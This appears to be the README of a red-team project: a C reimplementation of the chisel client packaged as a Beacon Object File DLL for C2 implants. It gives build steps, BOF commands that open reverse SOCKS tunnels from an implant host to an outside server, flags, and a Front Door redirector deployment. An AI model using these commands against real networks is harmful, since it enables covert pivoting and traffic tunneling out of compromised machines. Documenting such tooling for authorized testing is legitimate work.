# chisel-bof — a chisel client as a bare BOF-PE DLL

A from-scratch C implementation of the [jpillora/chisel](https://github.com/jpillora/chisel) client
(v1.12.1 wire protocol, `chisel-v3`) as a single x64 DLL: **no CRT, no Go runtime, only `ws2_32` +
`KERNEL32` imports**. It is executed like a Beacon Object File (export `go`) and then runs resident,
exactly like the real `chisel client` process. It interoperates byte-for-byte with the **stock,
unmodified chisel server** — proven against the official 1.12.0 binary, both directly and behind a
public TLS front end.

Nothing binary is committed and **nothing is published**: this tree carries source only — no
releases, no tags, no binary assets, and none may ever be attached to the repository. `build.bat`
builds everything from source on your machine, including the hash-verified Mbed TLS 3.6.7 static
library. The reference build that every suite in `tests/` was run against (mingw-w64 8.1.0,
msvcrt runtime, 2026-11-20) is 21,402,624 bytes,
`sha256 d71f4a1a4e5aaa2dda83c127024e438f7a25f9ac214ca4f123b72dcf21d427d7`. Your own build will
**not** hash-match it (the PE timestamp, plus the absolute `__FILE__` paths that Mbed TLS's debug
build embeds, depend on where the dependency was unpacked). Check the shape instead: imports
`ws2_32.dll` (13 winsock names) + `KERNEL32.dll` (`GetTickCount64`), export `go @1`, and zero
out-of-image absolute slots from `tools/pehl2dir.py --audit` (587/587).

## Build

```
build.bat                                   :: or: set TOOLCHAIN=C:\path\to\mingw64\bin && build.bat
build.bat clean                             :: wipe build/ and deps/, rebuild from nothing
```

Windows x64; mingw-w64 **x86_64** (tested: 8.1.0 msvcrt, winlibs GCC 16.2.0 posix-seh/UCRT);
`curl` + `tar` + PowerShell to fetch and hash-verify the crypto dependency; Python 3 for the tests.
On hosts where gcc's `cc1.exe` cannot start standalone, `GDBWRAP=1` (the default when `TOOLCHAIN`
is set) runs `gcc`/`ar`/`dlltool` under `gdb --batch -ex run --args`; `GDBWRAP=0` calls them
directly.

Output (all git-ignored): `build/chiselbof.dll` — the payload, what you execute from the beacon;
`build/pebdrv.exe` — test driver that packs CLI args BOF-style and calls `go()`; `deps/MBED.a` and
`deps/WS2_32nat.a`. The script wipes every intermediate and verifies `build/build.log` before
relinking, and refuses to relink over a DLL a running test client still has mapped (`OUTPUT LOCKED`)
— stale-object traps are in [docs/build-problems.md](docs/build-problems.md).

Build flags are load-bearing — a `-nostdlib` payload depends on pinned compiler behaviour, and every
pin is explained in [docs/build.md](docs/build.md). Build or link failure, or a payload that loads
and does nothing: [docs/build-problems.md](docs/build-problems.md).

## Run

Outflank Security Tooling (OST), or any Beacon-family C2 with a BOF primitive: artifact
`chiselbof.dll`, entry point `go`, then the server URL and the remote list.

```
exec_bof_async  zz  https://chisel.example.com  "R:1080:socks"
```

Always `https://` (or `wss://`) — the transport is TLS, so `ws://`/`http://` is not useful.
Chisel's flags are ordinary arguments, passed either as more records with the dashes stripped, or
as **one** record holding the whole command line (dashes legal there because the payload splits it;
`"` groups a value that contains a space):

```
exec_bof zzzzzz https://chisel.example.com R:1080:socks auth ops:pass keepalive 30s
exec_bof z      "https://chisel.example.com R:1080:socks --auth ops:pass --keepalive 30s"
```

Server side, for `R:` remotes (`--auth` is chisel's own flag, checked inside SSH):

```
chisel server --port 8000 --reverse -v --auth "ops:pass"
```

Two things that look wrong but are expected:

1. **The task never completes.** The proxy is resident; `go()` returns only when it is killed. Use
   the async variant so the beacon thread stays free — the tunnel lives as long as the implant does.
2. **`R:` remotes bind on the SERVER, not on the beacon host.** Check where the server runs:

   ```
   ss -tlnp | grep :1080
   curl -x socks5h://127.0.0.1:1080 -o /dev/null -w '%{http_code}\n' https://example.com
   ```

   With the server started `-v` you want `session#N: Open (… remotes=R:1080:socks)` and
   `tun: Bound proxies`.

Local smoke test, one machine, no C2:

```
chisel server --port 8406 --reverse -v --tls-cert cert.pem --tls-key key.pem
build\pebdrv.exe build\chiselbof.dll https://127.0.0.1:8406 "R:1080:socks"
```

### Remote syntax (chisel-compatible)

| feature | syntax | notes |
|---|---|---|
| SOCKS5 on the server | `R:1080:socks` | SOCKS5 hostname CONNECTs are resolved **on the client** (`socks5h` semantics) |
| reverse port forward | `R:<bind>:<host>:<port>` | `R:127.0.0.1:2222:10.0.0.5:22` |
| reverse UDP relay | `R:<bind>:<host>:<port>/udp` | chisel's gob `udpPacket{Src,Payload}` codec, source-peer fidelity (the DNS path) |
| forward remote | `<lport>:<host>:<port>` | local listener on the beacon host |

### Flags

Names, defaults and algorithms match the Go client, so a working `chisel client` command line
transfers over unchanged. Durations use chisel's syntax (`500ms`, `30s`, `5m`, `1h`; a bare number
means seconds, which `chisel` itself rejects). Full explanations, the payload-only knobs, and the
measured give-up timings: [docs/usage.md](docs/usage.md).

| flag | default | what it does |
|---|---|---|
| `--auth <user>:<pass>` | none | chisel's own auth: SSH password userauth, checked by the server's `PasswordCallback` (no `Authorization` header); split at the first colon, so the password may contain colons |
| `--keepalive <dur>` | `25s` | how often this client sends the SSH global request `ping` and waits for the `pong` |
| `--ping-timeout <dur>` | = keepalive | how long before a missing `pong` kills the session — the only thing that notices a black-holed path |
| `--connect-timeout <dur>` | `8s` | dial deadline, for the server socket and every proxied target |
| `--ws-timeout <dur>` | `45s` | TLS handshake and WebSocket upgrade read |
| `--ssh-timeout <dur>` | `30s` | SSH handshake, userauth and the `config` request |
| `--min-retry-interval <dur>` | `1s` | backoff floor |
| `--max-retry-interval <dur>` | `5m` | backoff ceiling |
| `--max-retry-count <n>` | unlimited | give up after `n` failed attempts; `0` and negatives mean unlimited, like chisel; the counter resets once a session has stayed up more than 5 s |

Argument limits: at most **24** records (or 24 tokens in the one-record form), at most **1024**
characters each, `z`, `b` and `Z` (UTF-16LE) all accepted. Anything over-limit makes `go()` return 6
**without running anything** — never a silent truncation. The contract suite is
`tests/packedargs.py` (16 cases, [tests/README.md](tests/README.md) §6).

## Deployment: public TLS front end

```
chiselbof.dll -> https://chisel.example.com:443   Azure Front Door terminates TLS
              -> www1.example.com:443             caddy, proxying to the backend
              -> 127.0.0.1:8000                   plain: chisel_1.12.0 server --port 8000 --reverse
```

The chisel server runs **plain HTTP** (`--reverse`, no `--tls`): the TLS terminus is the front end,
which must forward the WebSocket upgrade. Probe that before touching the client, from any machine:

```
curl -s -o /dev/null -D - --http1.1 \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Sec-WebSocket-Protocol: chisel-v3' \
  https://chisel.example.com/
```

Expect `HTTP/1.1 101 Switching Protocols` with `Sec-WebSocket-Protocol: chisel-v3`. A plain `GET /`
answering `404` is normal — chisel only answers the upgrade. Every requirement of that chain (P-384
intermediates in the trimmed crypto config, SNI actually on the wire, `Host:` exactly as Go sends
it, a TLS 1.2 pin, and reconnecting through the front end's own `502` when the backend is down)
began as a real failure against it; [docs/afd-front-end.md](docs/afd-front-end.md) has the
symptom→cause table and the measured reconnect behaviour.

## Shape of the payload

One DLL, one thread, no C runtime. Full detail: [docs/internals.md](docs/internals.md); the
flow-control invariants that keep long sessions alive under real traffic:
[docs/stability-invariants.md](docs/stability-invariants.md).

- **Image.** Export `go @1`; `DllMainCRTStartup` only returns. HIGHLOW, 587 absolute relocation
  slots, all inside the image — that is what makes it safe for a Beacon-style loader.
- **Memory and libc.** No heap APIs at all (only `GetTickCount64` from `KERNEL32`): one 20 MiB
  static arena in `.data` with a live-block bitmap. `memcpy`, `memset`, `memmove`, `memcmp`,
  `strlen`, `strcmp`, `strchr` and the `printf` family are ours; Winsock comes from a
  hand-written import def (13 names) with hand-written externs — no SDK headers, nothing from the
  CRT.
- **TLS.** Mbed TLS 3.6.7 with a trimmed config, min = max = TLS 1.2, SNI on, chain parsed but not
  verified. The crypto the SSH layer needs (SHA-256, chacha20, poly1305, X25519, the OpenSSH KDF) is
  ours.
- **Transport.** HTTP/1.1 upgrade with `Sec-WebSocket-Protocol: chisel-v3` and no authentication
  header, then WebSocket frames over one non-blocking **outbox**: a partially accepted frame is
  finished by the pump instead of blocking it.
- **Tunnel and control.** A real SSH client inside the WebSocket (`src/sshtun.c`):
  `curve25519-sha256` KEX, `chacha20-poly1305` records, ECDSA/RSA/Ed25519 host keys accepted, window
  2 MiB / max packet 32 KiB exactly matching x/crypto, rekey at 1 GiB served. After SSH auth comes
  one SSH global request `config` whose JSON body is chisel's own `Config` (the server logs those
  remotes at `Open`); each proxied stream is its own SSH channel, and `R:1080:socks` is one channel
  whose open carries the extra `socks` string.
- **Lifecycle and the single pump.** Dial (deadline `--connect-timeout`) → TLS + upgrade
  (`--ws-timeout`) → SSH, userauth, `config` (`--ssh-timeout`) → pump, answering and sending
  keepalive pings, until death → back off (`--min/max-retry-interval`, `--max-retry-count`) → redial
  and re-declare. Every phase is bounded, session rebuild is capped (`SESSION_MAX 512`) and the arena
  is reset between sessions. That one thread services TLS, WebSocket, pings and every channel, so no
  target write may ever spin: target writes wait for writability with a bounded `select()` and give
  up on that channel alone after ~30 s, and window-stalled channels are kept out of the `select()`
  set.

## Documentation

| file | contents |
|---|---|
| [docs/usage.md](docs/usage.md) | argument forms in full, every flag explained, payload-only knobs, measured backoff and give-up timings, the packed-buffer contract |
| [docs/build.md](docs/build.md) | toolchain pins and why each flag is there, `EXTRA_CFLAGS`, the `MBED.a` build, the config groups that are load-bearing |
| [docs/build-problems.md](docs/build-problems.md) | symptom → cause → fix table for build/link failures and silently-dead payloads |
| [docs/afd-front-end.md](docs/afd-front-end.md) | the Front Door + caddy deployment: traps, how to probe, measured reconnect behaviour |
| [docs/stability-invariants.md](docs/stability-invariants.md) | long-session invariants, what each `tests/` harness catches, reference results |
| [docs/internals.md](docs/internals.md) | wire facts, relocation hygiene, SSH/WS/chisel details learned the hard way |
| [tests/README.md](tests/README.md) | how to run the suites |

## Repository layout

```
build.bat                     one command: deps + payload (and `clean`)
tools/build-deps.bat          fetch + verify + build Mbed TLS, generate the winsock import lib
tools/pebdrv.c                test loader: packs CLI args BOF-style, calls `go()`
tools/pehl2dir.py             HIGHLOW -> DIR64 base-relocation audit/rewriter
src/stock.c                   BOF entry (`go()`), winsock/TLS glue, WS framing, outbox
src/sshtun.c                  the tunnel: SSH transport, channels, flow control, chisel control,
                              TCP + UDP remotes
src/crypto.c  src/x25519.c    SHA-256, SSH KDF, chacha20, poly1305, base64, X25519, libc substitutes
src/chisel_crypto.h           shared crypto declarations
src/mbedfmt.c                 snprintf/vsnprintf/printf used by Mbed TLS
deps/mbedinc/mbedtls/mbedtls_config.h   trimmed config (load-bearing, see docs/build.md)
deps/chiselbof.def            DLL exports (`go @1`)      deps/WS2_32nat.def   winsock imports
docs/  tests/                 notes (see above) and the suites
```

Never committed, always generated: `build/`, `deps/MBED.a`, `deps/WS2_32nat.a`,
`deps/mbedtls-*/`, `deps/_mbedtls-*.tar.gz`, `tests/pub/`.

## Third-party and licensing

- **Mbed TLS 3.6.7** (Apache-2.0 / GPL-2.0 dual) — fetched and hash-verified at build time, never
  committed; sources unmodified, compiled with `deps/mbedinc/…/mbedtls_config.h`.
- **jpillora/chisel** (MIT) is the protocol reference; this is original C and contains no Go or
  chisel source.
- This repository's own code: MIT, see `LICENSE`.
